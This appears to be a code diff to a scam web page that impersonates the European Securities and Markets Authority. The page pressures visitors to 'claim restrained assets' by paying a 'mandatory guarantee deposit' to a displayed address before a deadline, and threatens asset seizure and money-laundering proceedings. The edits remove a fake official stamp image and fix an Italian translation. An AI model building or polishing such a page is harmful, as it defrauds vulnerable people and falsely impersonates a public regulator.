@@ -29,7 +29,7 @@ header { padding: 20px 10%; display: flex; justify-content: space-between; align
 .brand-titles { border-left: 1px solid var(--border); padding-left: 20px; }
 .brand-titles h1 { margin: 0; font-size: 20px; color: var(--eu-blue); font-weight: 700; }
 .main-content { max-width: 900px; margin: 40px auto; padding: 0 20px; min-height: 600px; }
-.card { background: #fff; border: 1px solid var(--border); padding: 35px; border-radius: 2px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: relative; }
+.card { background: #fff; border: 1px solid var(--border); padding: 35px; border-radius: 2px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
 .form-group { margin-bottom: 25px; }
 label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 8px; }
 input[type="text"], input[type="email"], select { width: 100%; padding: 12px; border: 1px solid #8d959b; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
@@ -37,7 +37,7 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .btn-eu:hover { background: #002673; }
 .btn-outline { background: #ffffff; color: var(--eu-blue); border: 2px solid var(--eu-blue); margin-top: 12px; }
 .btn-outline:hover { background: #f0f4ff; }
-.phase { display: none; position: relative; }
+.phase { display: none; }
 .phase.active { display: block; }
 .status-header { background: #fdf7f7; border: 1px solid #ebccd1; padding: 25px; text-align: center; margin-bottom: 20px; }
 .amount-text { font-size: 42px; font-weight: 700; color: var(--danger); display: block; line-height: 1.1; }
@@ -67,19 +67,6 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .address-box { font-family: 'Courier New', monospace; word-break: break-all; font-size: 16px; font-weight: 700; color: #1e293b; padding-right: 40px; }
 .copy-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--eu-blue); cursor: pointer; font-size: 20px; }
 
-/* STAMP STYLING */
-.official-stamp {
-  position: absolute;
-  right: 15px;
-  bottom: 110px;
-  width: 150px;
-  height: auto;
-  opacity: 0.90;
-  transform: rotate(-10deg);
-  pointer-events: none;
-  z-index: 5;
-}
-
 .modal-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
 .modal-box { background: white; padding: 40px; max-width: 550px; border-radius: 4px; text-align: left; }
 
@@ -93,13 +80,6 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
   .card { border: none; box-shadow: none; padding: 0; }
   .main-content { max-width: 100%; margin: 0; padding: 0; }
   header { border-bottom: 2px solid var(--eu-blue); padding-bottom: 20px; }
-  .official-stamp {
-    display: block !important;
-    position: absolute;
-    right: 20px;
-    bottom: 80px;
-    width: 140px;
-  }
 }
 </style>
 </head>
@@ -180,10 +160,6 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
         <tr><td data-i18n="tblAuth">Regulatory Authority:</td><td><strong>ESMA - European Securities and Markets Authority</strong></td></tr>
         <tr><td data-i18n="tblJurisdiction">Jurisdiction:</td><td><strong>EEA / Switzerland Hub</strong></td></tr>
       </table>
-
-      <!-- OFFICIAL STAMP -->
-      <img src="https://i.imgur.com/zWuCTYp.png" alt="Official ESMA Stamp" class="official-stamp">
-
       <button class="btn-eu" style="background: var(--success);" onclick="openAgreement()" data-i18n="btnClaim">CLAIM RESTRAINED ASSETS</button>
       <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
     </div>
@@ -217,9 +193,6 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
           Pursuant to European Anti-Money Laundering (AML) Regulations, the beneficiary has until <strong>September 30th, 2026 at 23:59 CET</strong> to settle the mandatory guarantee deposit. Failure to complete verification within this statutory period will result in immediate permanent asset seizure, and the file may be referred to the relevant judicial court for formal Money Laundering proceedings.
         </span>
       </div>
-
-      <!-- OFFICIAL STAMP -->
-      <img src="https://i.imgur.com/zWuCTYp.png" alt="Official ESMA Stamp" class="official-stamp">
 
       <button class="btn-eu" onclick="toCalculation()" data-i18n="btnCalc">PROCEED TO DEPOSIT CALCULATION</button>
       <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
@@ -851,7 +824,7 @@ const i18n = {
   },
   IT: {
     topBanner: "Database ufficiale dell'Autorità europea degli strumenti finanziari e dei mercati",
-    subHeader: "Autorité europea degli strumenti finanziari e dei mercati",
+    subHeader: "Autorità europea degli strumenti finanziari e dei mercati",
     loginTitle: "Accesso Identità Verificata",
     loginSub: "Inserisci i tuoi dati registrati per accedere al registro delle attività.",
     lblName: "Nome Legale Completo",
